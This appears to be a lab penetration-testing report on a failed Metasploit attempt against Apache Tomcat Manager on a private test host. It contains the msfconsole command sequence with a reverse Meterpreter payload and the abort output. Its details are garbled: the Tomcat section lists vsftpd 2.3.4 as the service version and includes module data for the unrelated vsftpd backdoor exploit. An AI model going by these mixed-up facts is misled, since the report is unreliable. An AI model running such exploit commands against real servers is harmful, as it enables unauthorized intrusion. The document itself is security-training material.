# Exploitation Phase – 7. Apache Tomcat Manager Application Deployer

---

## Vulnerability Phase Identification

**Phase:** Exploitation  
**Vulnerability Identified During:** Scanning & Vulnerability Assessment  
**Affected Service:** Apache Tomcat Manager
**Service Version:** vsftpd 2.3.4  
**Port:** TCP 80

This vulnerability was identified during service enumeration and confirmed during vulnerability assessment using Nmap and Searchsploit.

---

## Vulnerability Overview

Apache Tomcat provides a Manager Application that allows authenticated users to deploy and undeploy web applications.
If valid credentials are obtained, an attacker can upload a malicious WAR file, leading to remote code execution on the server.

### Impact
- Remote command execution
- Full system compromise (depending on Tomcat privileges)
- Web server takeover

This vulnerability is authentication-dependent, meaning exploitation is possible only if Tomcat Manager is present and accessible.

---

## Tool Used: Metasploit Framework

### Why This Tool Is Used
Module Information

- Module Name: exploit/multi/http/tomcat_mgr_deploy
- Rank: Excellent
- Authentication Required: Yes
- Payload Used: java/meterpreter/reverse_tcp

---

## Exploit Module Information

- **Module Name:** `exploit/unix/ftp/vsftpd_234_backdoor`
- **Payload Used:** `cmd/unix/interact`
- **Exploit Type:** Bind shell (root)
- **Default Backdoor Port:** 6200

---

## Exploitation Command Sequence

    msfconsole -q
    use exploit/multi/http/tomcat_mgr_deploy
    set RHOSTS 192.168.56.102
    set LHOST 192.168.56.1
    exploit

## Exploit Output (Successful)

    [-] Exploit aborted due to failure: not-found:
    The target server fingerprint
    "Apache/2.2.8 (Ubuntu) DAV/2 (Powered by PHP/5.2.4-2ubuntu5.10)" does not match "(Apache.*(Coyote|Tomcat))"
    [*] Exploit completed, but no session was created.

## Exploitation Result:
- Status: ❌ Exploitation Failed
- Session Opened: No

## Reason for Failure
- The target web server is Apache HTTP Server, not Apache Tomcat
- Tomcat Manager Application is not installed or exposed
- Server fingerprint did not match Tomcat/Coyote signatures
- The exploit correctly aborted to prevent false exploitation

## Security Findings
- Apache web server detected
- No Apache Tomcat service identified
- No Tomcat Manager interface accessible
- Attack surface does not include Tomcat Manager

## Risk Assessment
| Factor | Assessment |
|---|------|
| Tomcat Presence | Not Detected | 
| Exploit Applicability | Not Applicable | 
| Session Creation | Failed | 
| Security Risk | Low |

## Remediation Recommendations
Although Tomcat was not present, general best practices include:
- Avoid deploying Tomcat Manager on production servers
- Restrict /manager access via IP whitelisting
- Enforce strong authentication
- Remove default credentials
- Use HTTPS for management interfaces

## Conclusion
The Apache Tomcat Manager Application Deployer exploit was not successful because the target system was running Apache HTTP Server, not Apache Tomcat.
Since the required vulnerable service was absent, exploitation was not possible, and no session was created.

This result confirms correct exploit validation and proper target fingerprint checking.

---
